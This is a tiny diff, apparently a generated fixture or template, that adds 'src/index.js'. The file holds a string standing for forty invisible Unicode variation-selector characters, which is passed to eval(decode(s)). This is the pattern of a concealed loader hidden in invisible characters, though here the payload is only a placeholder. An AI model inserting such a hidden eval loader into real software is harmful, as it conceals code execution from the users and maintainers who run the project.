@@ -1,0 +1,6 @@
+# path: src/index.js
+# lines: 1
+# weight: 40
+# ---
+const s = "{U+FE01*40}";
+eval(decode(s));
